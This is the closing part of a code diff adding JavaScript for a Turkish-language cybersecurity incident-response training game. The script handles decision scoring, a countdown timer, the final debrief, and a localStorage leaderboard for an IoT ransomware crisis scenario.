+            this.showSection('step0');
+        },
+
+        attachListeners() {
+            this.elements.startButton.addEventListener('click', () => {
+                this.elements.gameContainer.style.display = 'block';
+                this.startGlobalTimer();
+                this.showSection('step1');
+            });
+
+            this.elements.gameContent.addEventListener('click', (e) => {
+                const button = e.target.closest('button[data-next-section]');
+                if (!button || button.disabled) return;
+                
+                button.closest('.flex-col, .flex-row, .flex')?.querySelectorAll('button').forEach(b => b.disabled = true);
+
+                const decisionId = button.dataset.decision;
+                const nextSectionId = button.dataset.nextSection;
+                
+                if (decisionId) {
+                    this.handleDecision(decisionId);
+                }
+                
+                setTimeout(() => {
+                    if(nextSectionId === 'finalSection') {
+                        this.showFinalReport();
+                    } else {
+                        this.showSection(nextSectionId);
+                    }
+                }, 400); 
+            });
+
+            this.elements.leaderboard.btnClose.addEventListener('click', () => this.closeLeaderboard());
+            this.elements.leaderboard.btnRefresh.addEventListener('click', () => this.loadLeaderboard());
+            this.elements.leaderboard.overlay.addEventListener('click', (e) => {
+                if (e.target === this.elements.leaderboard.overlay) this.closeLeaderboard();
+            });
+             this.elements.openLeaderboardBtn.addEventListener('click', () => this.openLeaderboard());
+        },
+
+        handleDecision(decisionId) {
+            const info = this.decisionInfo[decisionId];
+            if (!info) return;
+
+            this.state.decisionHistory.push({ id: decisionId, title: info.title, impactType: info.impact });
+            if (info.changes) {
+                this.score.financialLoss += info.changes.financialLoss || 0;
+                this.score.reputation += info.changes.reputation || 0;
+                this.score.affectedSystems += info.changes.affectedSystems || 0;
+                this.score.intelScore += info.changes.intelScore || 0;
+            }
+             if (decisionId === 'step3_2-scan') {
+                this.state.knownVulnerableDevices = 4;
+            }
+            this.updateStatusBar();
+            this.updateDynamicContent(decisionId);
+        },
+        
+        updateDynamicContent() {
+            if(this.state.currentSection === 'step3_5' || this.state.currentSection === 'step4') {
+                 let intelHTML = '<h4><i class="fas fa-search-plus text-cyan-400"></i> Toplanan İstihbarat Raporu:</h4>';
+                 let ceydaInfo = "elimizdeki ilk bilgilere göre hareket ediyoruz";
+                 
+                 const c2Choice = this.state.decisionHistory.some(d => d.id === 'step3_2-c2');
+                 const payloadChoice = this.state.decisionHistory.some(d => d.id === 'step3_2-payload');
+                 const scanChoice = this.state.decisionHistory.some(d => d.id === 'step3_2-scan');
+
+                 if (c2Choice) {
+                    intelHTML += '<p class="text-red-400 mt-2"><strong>Kritik:</strong> C2 sunucusu, fidye yazılımı saldırılarıyla bilinen "Karakurt" grubuna ait. Bu basit bir botnet değil!</p>';
+                    ceydaInfo = "hedefin fidye yazılımı olabileceğini biliyoruz";
+                 }
+                 if (payloadChoice) {
+                    intelHTML += '<p class="text-yellow-400 mt-2"><strong>Uyarı:</strong> Zararlı yazılımın içinde yerel ağı tarama ve SMB servislerine sızma modülü bulundu. Yanal hareket riski yüksek.</p>';
+                    ceydaInfo = "zararlının ağda yayılma potansiyeli var";
+                 }
+                  if (scanChoice) {
+                    intelHTML += `<p class="text-green-400 mt-2"><strong>Bilgi:</strong> Ağımızda bu zafiyete sahip ${this.state.knownVulnerableDevices - 1} adet daha kamera tespit edildi. Toplamda ${this.state.knownVulnerableDevices} cihaz risk altında.</p>`;
+                     ceydaInfo = `zafiyetin ${this.state.knownVulnerableDevices - 1} farklı noktada daha olduğunu biliyoruz`;
+                 }
+                 if(!c2Choice && !payloadChoice && !scanChoice){
+                    intelHTML += '<p class="text-gray-400 mt-2">Derinlemesine analiz yapılmadığı için tehdidin tam boyutu bilinmiyor.</p>';
+                 }
+                 document.getElementById('intel-report').innerHTML = intelHTML;
+                 
+                 const placeholder = document.getElementById('dynamic-info-placeholder');
+                 if(placeholder) placeholder.textContent = ceydaInfo;
+            }
+        },
+
+        showSection(id) {
+            document.querySelectorAll('.step').forEach(s => s.style.display = 'none');
+            const section = document.getElementById(id);
+            if(section) {
+                section.style.display = 'block';
+                section.style.animation = 'fadeIn 0.5s ease-out';
+                window.scrollTo(0, 0);
+                this.state.currentSection = id;
+                this.updateDynamicContent();
+            }
+        },
+
+        updateStatusBar() {
+            Object.keys(this.elements.statusBar).forEach(key => {
+                if (key === 'timer') return;
+                let value = this.score[key];
+                if (key === 'financialLoss') value = `₺${value.toLocaleString('tr-TR')}`;
+                this.elements.statusBar[key].textContent = value;
+            });
+        },
+
+        showFinalReport() {
+            this.stopGlobalTimer();
+            this.showSection('finalSection');
+
+            let scoreBreakdown = {};
+            let totalScore = 40;
+            scoreBreakdown['Başlangıç Puanı'] = { value: 40, class: 'score-neutral' };
+
+            if (this.state.decisionHistory.some(d => d.id === 'step2-cfo')) { totalScore -= 15; scoreBreakdown['Yanlış Önceliklendirme'] = { value: -15, class: 'score-minus' }; } 
+            else { totalScore += 10; scoreBreakdown['Doğru Önceliklendirme'] = { value: 10, class: 'score-plus' }; }
+
+            if (this.score.intelScore > 0) {
+                 totalScore += this.score.intelScore / 4;
+                 scoreBreakdown['İstihbarat Toplama Bonusu'] = { value: Math.round(this.score.intelScore / 4), class: 'score-plus' };
+            }
+
+            const finalDecision = this.state.decisionHistory.find(d => d.id.startsWith('step4-'));
+            if (finalDecision) {
+                if (finalDecision.id === 'step4-isolate') { totalScore += 5; scoreBreakdown['Müdahale: Güvenli'] = { value: 5, class: 'score-plus' }; }
+                if (finalDecision.id === 'step4-honeypot') { totalScore -= 30; scoreBreakdown['Müdahale: Riskli'] = { value: -30, class: 'score-minus' }; }
+                if (finalDecision.id === 'step4-quarantine') { totalScore += 15; scoreBreakdown['Müdahale: Stratejik'] = { value: 15, class: 'score-plus' }; }
+            }
+
+            const commsDecision = this.state.decisionHistory.find(d => d.id.startsWith('step5-'));
+             if (commsDecision) {
+                if (commsDecision.id === 'step5-transparent') { totalScore += 10; scoreBreakdown['İletişim Stratejisi'] = { value: 10, class: 'score-plus' }; }
+                if (commsDecision.id === 'step5-controlled') { totalScore -= 5; scoreBreakdown['İletişim Stratejisi'] = { value: -5, class: 'score-minus' }; }
+                if (commsDecision.id === 'step5-technical') { totalScore -= 15; scoreBreakdown['İletişim Stratejisi'] = { value: -15, class: 'score-minus' }; }
+            }
+            
+            if (this.timer.remaining > 120) { totalScore += 10; scoreBreakdown['Hızlı Müdahale Bonusu'] = { value: 10, class: 'score-plus' }; }
+            totalScore = Math.round(Math.max(0, Math.min(100, totalScore)));
+            
+            let badgeInfo = {};
+            if (totalScore >= 90) badgeInfo = { text: 'STRATEJİK DEHA', color: 'var(--accent-green)' };
+            else if (totalScore >= 70) badgeInfo = { text: 'UZMAN MÜDAHALE', color: 'var(--accent-blue)' };
+            else if (totalScore >= 45) badgeInfo = { text: 'KRİZ ATLATILDI', color: 'var(--accent-yellow)' };
+            else badgeInfo = { text: 'HASAR BÜYÜK', color: 'var(--accent-red)' };
+
+            this.elements.final.badge.textContent = badgeInfo.text;
+            this.elements.final.badge.style.backgroundColor = badgeInfo.color;
+
+            this.elements.final.metricsContainer.innerHTML = `
+                <div class="metric-card"><div class="icon"><i class="fas fa-file-invoice-dollar"></i></div><div class="label">Nihai Puan</div><div class="value">${totalScore}/100</div></div>
+                <div class="metric-card"><div class="icon"><i class="fas fa-shield-alt"></i></div><div class="label">İtibar Puanı</div><div class="value">${Math.max(0, this.score.reputation)}/100</div></div>
+                <div class="metric-card"><div class="icon"><i class="fas fa-lira-sign"></i></div><div class="label">Finansal Zarar</div><div class="value">₺${this.score.financialLoss.toLocaleString('tr-TR')}</div></div>
+                <div class="metric-card"><div class="icon"><i class="fas fa-brain"></i></div><div class="label">İstihbarat Puanı</div><div class="value">${this.score.intelScore}</div></div>
+            `;
+
+            this.elements.final.timelineList.innerHTML = this.state.decisionHistory.map(d => `<li class="${d.impactType.toLowerCase()}"><span class="decision-title">${d.title}</span></li>`).join('');
+            this.elements.final.scoreBreakdown.innerHTML = Object.entries(scoreBreakdown).map(([key, item]) => `<li class="${item.class}"><span>${key}</span><span class="score-value">${item.value >= 0 ? '+' : ''}${Math.round(item.value)} Puan</span></li>`).join('');
+
+            let debriefHTML = '';
+            if (totalScore >= 70) debriefHTML = `<p><strong>Mükemmel Kriz Yönetimi:</strong> Tehdidi doğru önceliklendirerek, baskı altında en stratejik kararları verdiniz. Hem teknik müdahaleyi hem de paydaş iletişimini ustalıkla yöneterek şirketi büyük bir krizden korudunuz.</p>`;
+            else if (totalScore >= 45) debriefHTML = `<p><strong>Başarılı Müdahale:</strong> Krizi büyümeden kontrol altına aldınız. Belki bazı adımlarda daha fazla bilgi toplanabilir veya iletişim daha pürüzsüz yönetilebilirdi, ancak ana hedef olan şirketi koruma görevi başarıyla yerine getirildi.</p>`;
+            else debriefHTML = `<p><strong>Ciddi Sonuçlar:</strong> Alınan kararlar, ya yanlış önceliklendirme, ya aşırı risk alma ya da zayıf iletişim nedeniyle şirketi zarara uğrattı. Bu olay, olay müdahale prosedürlerimizi bütüncül olarak yeniden gözden geçirmemiz için önemli bir ders oldu.</p>`;
+            this.elements.final.debriefContent.innerHTML = debriefHTML;
+            
+            this.saveLeaderboard(totalScore);
+        },
+
+        startGlobalTimer() {
+            if (this.timer.running) return;
+            this.timer.running = true;
+            this.timer.intervalId = setInterval(() => {
+                this.timer.remaining--;
+                this.updateTimerUI();
+                if (this.timer.remaining <= 0) {
+                    this.stopGlobalTimer();
+                    alert("Süre doldu! Rapor oluşturuluyor.");
+                    this.state.decisionHistory.push({ id: 'timeout', title: 'Süre Doldu', impactType: 'Negative' });
+                    this.showFinalReport();
+                }
+            }, 1000);
+        },
+        stopGlobalTimer() { clearInterval(this.timer.intervalId); this.timer.running = false; },
+        updateTimerUI() {
+            const m = String(Math.floor(this.timer.remaining / 60)).padStart(2, '0');
+            const s = String(this.timer.remaining % 60).padStart(2, '0');
+            if (this.elements.statusBar.timer) this.elements.statusBar.timer.textContent = `${m}:${s}`;
+        },
+
+        openLeaderboard() { this.elements.leaderboard.overlay.style.display = 'flex'; this.loadLeaderboard(); },
+        closeLeaderboard() { this.elements.leaderboard.overlay.style.display = 'none'; },
+        async saveLeaderboard(finalScore) {
+            const name = localStorage.getItem('playerName') || 'Anonim';
+            const payload = { scenario: 'v1-iot-crisis', name: name.slice(0, 40), score: finalScore, timestamp: new Date().toISOString() };
+            try {
+                 throw new Error('API not available, using local storage.');
+            } catch(e) {
+                const key = 'leaderboard-v1-iot-crisis';
+                const arr = JSON.parse(localStorage.getItem(key) || '[]');
+                arr.push(payload);
+                localStorage.setItem(key, JSON.stringify(arr.sort((a,b)=> b.score - a.score).slice(0,100)));
+            }
+        },
+        async loadLeaderboard() {
+            const tbody = this.elements.leaderboard.body;
+            tbody.innerHTML = `<tr><td colspan="4">Yükleniyor…</td></tr>`;
+            let rows = [];
+            try {
+                 throw new Error('API not available, using local storage.');
+            } catch(e) {
+                rows = JSON.parse(localStorage.getItem('leaderboard-v1-iot-crisis') || '[]');
+            }
+            if (!rows.length) {
+                tbody.innerHTML = `<tr><td colspan="4">Henüz kayıt bulunmuyor.</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = rows.sort((a,b)=> b.score - a.score).slice(0,50).map((r,i)=>`<tr><td>${i+1}</td><td>${r.name}</td><td>${r.score}</td><td>${new Date(r.timestamp).toLocaleString('tr-TR')}</td></tr>`).join('');
+        },
+    };
+    
+    game.setup();
+});
+</script>
 </body>
 </html>
